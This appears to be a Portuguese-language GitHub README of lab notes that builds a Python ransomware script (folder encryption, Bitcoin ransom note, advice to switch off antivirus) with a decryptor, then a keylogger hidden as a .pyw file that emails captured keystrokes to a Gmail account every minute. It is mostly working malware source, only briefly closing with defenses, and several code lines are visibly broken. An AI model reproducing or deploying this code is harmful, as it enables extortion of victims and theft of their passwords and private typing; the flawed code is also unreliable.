#RANSOMWARE

Constrido o ambiente> 
 
 
 

Em uma pasta com o nome malware>
criar uma outra pasta com o nome dados_confidencias e outro senhas.txt

e um file rasamware.py
com essa programaçao: 

 
 
from cryptography.fernet import Fernet
import os
#01 gerar uma chave e salvá-la em um arquivo
def gerar_chave():  
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
#02 carregar a chave salva
def carregar_chave():  
    return open("chave.key", "rb").read()
#03 criptografar um unico arquivo
def criptografar_arquivos(arquivo, chave):  
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados) 
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
#04 encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):  
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
#05 mensagem de resgate
def criar_mensagem_resgate():  
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados! \n.")
        f.write("Para recuperar seus arquivos, envia 1 Bitcoin para o endereço XXXXXX. com o comprovante \n")
        f.write("depois disso, enviamos a chave para recuperar seus dados.\n")
#06 Execução do ransomware
def main():  
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivos(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos criptografados.")
    if __name__ == "__main__":
        main()    


quando execute e o antivirus esta ligado apaga o arquivo> 
 


 


para funcionar tem que desligar o antivirus> 

mas quando executa 


>>>>>>>>>>>>>>>>>>>>>>>

Descriptografando os arquivos

criando arquivo descriptografar.py


 
 
#carregando as bibliotecas
from cryptography.fernet import Fernet
#onde vai carregar a chavekey e o que foi criptrografado.
def carregar_chave():  
    return open("chave.key", "rb").read()
#descriptografar um unico arquivo
def descriptografar_arquivos(arquivo, chave):  
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_desencriptados = f.decrypt(dados) 
    with open(arquivo, "wb") as file:
        file.write(dados_desencriptados)
#encontrar os arquivos na pasta test_files      
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
#execução da descriptografia mensagem
def main():  
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivos(arquivo, chave)
    print("Arquivos restaurados com sucesso!")    
if __name__ == "__main__":
    main()  
 



colocando pra rodar 
retorna com tudo recuperado.

 


<img width="764" height="2793" alt="image" src="https://github.com/user-attachments/assets/e69270ce-a45f-435d-9ad8-592603b3c60a" />

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

#KEYLOGGER

Regirar tudo que eh digitado.

Comercamdo a criaçao>
com o python instalado no vscode, intalando o pynput:

PS C:\Users\Grupo Next\KEYLOGGER> pip install pynput
Collecting pynput
  Downloading pynput-1.8.1-py2.py3-none-any.whl.metadata (32 kB)
Collecting six (from pynput)
  Downloading six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Downloading pynput-1.8.1-py2.py3-none-any.whl (91 kB)
Downloading six-1.17.0-py2.py3-none-any.whl (11 kB)
Installing collected packages: six, pynput
Successfully installed pynput-1.8.1 six-1.17.0
PS C:\Users\Grupo Next\KEYLOGGER> 


lista do que vai ser progamado > 
1- vai ficar em execucao em segundo plano.
2- toda vez que o usuario digitar uma tecla, vai ficar capturando o teclado.
3- o que for digitado, sera gravado em um arquivo .txt.
4- o arquivo vai mostrar tudo o que foi digitado, de forma seguencial


Vs code 

pasta keylogger
instalar no terminal> 
 pip install pynput
filer> keylogger.py


importar a biblioteca



#importar a bilblioteca pynput para capturar eventos do teclado
from pynput import keyboard #impotar a biblioteca pynput para capturar eventos do teclado em tempo real
 
#ignorar algumas teclas desnecessárias no log
IGNORED_KEYS = {keyboard.Key.shift, 
                keyboard.Key.shift_r,
                keyboard.Key.ctrl_l,
                keyboard.Key.ctrl_r, 
                keyboard.Key.alt_l, 
                keyboard.Key.alt_r,
                keyboard.Key.caps_lock,
                keyboard.Key.cmd
            }
#vai ser chamada toda vez que for precionada uma tecla
def on_press(key):
    try:
        #se for uma tecla normal (letra,numero,simbolo
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
            
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORED_KEYS:
                pass
            else:
                f.write(f"[{key}]")
#iniciar o listener do teclado
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


## Rodando
deletar a pasta log.txt se estiver ja criada. 
quando inciar o programa automaticamente eh gerado a pasta. E fica dessa forma o terminal:




Tudo fica registrado no arquivo 







Tornando o keyloogger invisivel> 


.pyw *[e as aplicaçao no windows em segundo plano*

no terminal, ja dentro da pasta keylogger
comando>
ren .\keylogger.py .\keylogger.pyw

(mudando a extensao .py para .pyw)



Automatizar o email para receber email>

Criar email teste:< 


::::::::::::::::::::::::::::::::::::::::::::::

rodar o comando <
pip install secure-smtplib

:::::::::::::::::::::::::::::::::::::::::::::::::

criando o progrma



from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
#configurações do email
EMAIL_ORIGEM = "demokeylogger0@gmail.com"
EMAIL_DESTINO = "demokeylogger0@gmail.com"
SENHA_EMAIL= "sass asas sasa asass" #senha de dois fatores do app do gmail
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'dados capturados pelos keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar email: {e}")
        log = ""
        #agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

    def on_press(key):
        global log
        try:
            log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.backspace:
                log += "[<] "
            elif key == keyboard.Key.tab:
                log += "\t"
            elif key == keyboard.Key.esc:
                log += " [ESC] "
            elif key in IGNORED_KEYS:
                pass
            else:
                log += f"[{key}]"

#iniciar o keylogger e o envio de email
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()

::::::::::::::::::::::::::::::

Executando> 




::::::::::::::::::::::::

como evitar>
antivirus bloquea, monitoramento, consiencia do usuarios, marquina virtual ou isolada para teste. 


<img width="1169" height="3946" alt="image" src="https://github.com/user-attachments/assets/263c1861-69f8-483d-bef0-34bd47ad7d27" />
